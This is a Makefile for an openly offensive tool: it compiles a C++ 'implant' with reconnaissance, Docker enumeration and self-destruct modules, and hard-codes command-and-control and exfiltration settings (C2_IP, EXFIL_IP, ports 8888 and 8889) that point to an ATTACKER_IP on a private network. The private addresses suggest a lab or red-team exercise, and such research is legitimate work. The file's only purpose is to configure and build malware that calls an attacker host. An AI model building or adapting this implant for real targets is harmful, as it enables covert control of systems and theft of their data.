TARGET_IP ?= 10.37.1.248
ATTACKER_IP ?= 10.37.1.249
CXX = g++
CXXFLAGS = -O2 -s -std=c++17 \
           -DC2_IP='"$(ATTACKER_IP)"' \
           -DC2_PORT=8888 \
           -DEXFIL_IP='"$(ATTACKER_IP)"' \
           -DEXFIL_PORT=8889
LDFLAGS = -lssl -lcrypto

TARGET = implant
SRC = implant.cpp recon.cpp docker_enum.cpp self_destruct/self_destruct.cpp

all: $(TARGET)

$(TARGET): $(SRC) recon.h docker_enum.h self_destruct/self_destruct.h
	$(CXX) $(CXXFLAGS) -I. -o $(TARGET) $(SRC) $(LDFLAGS)

clean:
	rm -f $(TARGET)
